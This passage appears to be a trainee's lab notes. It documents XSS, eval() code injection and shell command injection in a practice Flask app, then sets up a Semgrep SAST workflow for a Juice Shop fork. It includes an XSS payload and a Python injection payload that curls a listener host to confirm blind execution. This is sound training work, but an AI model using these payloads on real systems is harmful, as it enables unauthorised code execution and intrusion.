**Proof of Concept:**

```
<img src=x onerror="alert('XSS Vulnerability!')">
```


![[Tasks-20251127112520866.webp|923]]


![[Tasks-20251127112538850.webp]]


![[Tasks-20251127112552195.webp]]


## Command Injection

The application uses Python's eval() function to process user-supplied discount codes. The eval() function executes arbitrary Python expressions with full access to the application's context. Despite attempts to restrict the namespace with empty globals {}, the attacker can still access built-in functions through Python's introspection capabilities, leading to complete system compromise.

**Vulnerable Code Flow:**

1. **Input:** User enters discount code in `/orders/add` form
2. **Processing:** Line 175 in [app.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html): `val = float(eval(raw, {}, local_vars))`
3. **Execution:** Arbitrary Python code runs with Flask app privileges


![[Tasks-20251127112803476.webp|740]]


### Command injection in orders

The application passes unsanitized user input directly into a shell command using `subprocess.check_output()` with `shell=True`. The shell interprets special characters like `&`, `|`, `;`, and `$()` as command separators, allowing attackers to inject additional commands that execute with the same privileges as the web application.


**Vulnerable Code Flow:**

1. **Input:** User enters SKU in `/inventory/check` form
2. **Command Construction:** Line 236 in [app.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html): `cmd = f"echo {sku}"`
3. **Execution:** Line 237: `subprocess.check_output(cmd, shell=True, ...)`
4. **Shell Interpretation:** Windows PowerShell or CMD executes the constructed string


```
__import__('os').system('curl http://192.168.0.100:9000/test.txt')
```

we can test this payload in the discount section, we wont get a result back hence its blind so what we can do is setup a listener to see if we get a call back or not

```
kali@kali 2025-11-27 01:19:43 ~> updog -p 9000
[+] Serving /home/kali...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:9000
 * Running on http://192.168.0.100:9000
Press CTRL+C to quit

```

Now we can run the payload and see what happens

![[Tasks-20251127113056797.webp|968]]

![[Tasks-20251127113107824.webp]]



there were more than 3 vulnerabilities in the website, multiple instances of xss and insecure session management where found



---



# Task 13


```
PS E:\wosoom> cd git
PS E:\wosoom\git> ls
PS E:\wosoom\git> git clone https://github.com/masar-wo-soom/juice-shop.git
Cloning into 'juice-shop'...
remote: Enumerating objects: 140338, done.
remote: Total 140338 (delta 0), reused 0 (delta 0), pack-reused 140338 (from 1)
Receiving objects: 100% (140338/140338), 146.46 MiB | 2.26 MiB/s, done.
Resolving deltas: 100% (110721/110721), done.
```


```
PS E:\wosoom\git\juice-shop> New-Item -Path .github/workflows/semgrep-sast.yml -ItemType File                          
New-Item : The file 'E:\wosoom\git\juice-shop\.github\workflows\semgrep-sast.yml' already exists.
At line:1 char:1
+ New-Item -Path .github/workflows/semgrep-sast.yml -ItemType File
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (E:\wosoom\git\j...emgrep-sast.yml:String) [New-Item], IOException
    + FullyQualifiedErrorId : NewItemIOError,Microsoft.PowerShell.Commands.NewItemCommand
 
PS E:\wosoom\git\juice-shop>


```



![[Tasks-20251129035158958.webp]]


**note**: this error is happening because I already created the file

![[Tasks-20251129035421381.webp]]




```
PS E:\wosoom\git\juice-shop> git add .github/workflows/semgrep-sast.yml
PS E:\wosoom\git\juice-shop> git commit -m "Add Semgrep SAST workflow"
[master bfd76de3a9] Add Semgrep SAST workflow
 1 file changed, 19 insertions(+)
 create mode 100644 .github/workflows/semgrep-sast.yml
PS E:\wosoom\git\juice-shop> git push origin main
error: src refspec main does not match any
error: failed to push some refs to 'https://github.com/masar-wo-soom/juice-shop.git'
PS E:\wosoom\git\juice-shop> git push origin master
Enumerating objects: 8, done.
Counting objects: 100% (8/8), done.
Delta compression using up to 12 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (5/5), 608 bytes | 608.00 KiB/s, done. 
Total 5 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
remote: Resolving deltas: 100% (3/3), completed with 3 local objects.
To https://github.com/masar-wo-soom/juice-shop.git
   ded6fc5f7e..bfd76de3a9  master -> master
PS E:\wosoom\git\juice-shop>
```






![[Tasks-20251129035346471.webp]]




![[Tasks-20251129035508926.webp]]





Now we want to trigger the workflow through a code change! 


![[Tasks-20251129035605687.webp]]


now going to the actions tabs we can see it!!


![[Tasks-20251129035635965.webp]]

![[Tasks-20251129035742634.webp]]

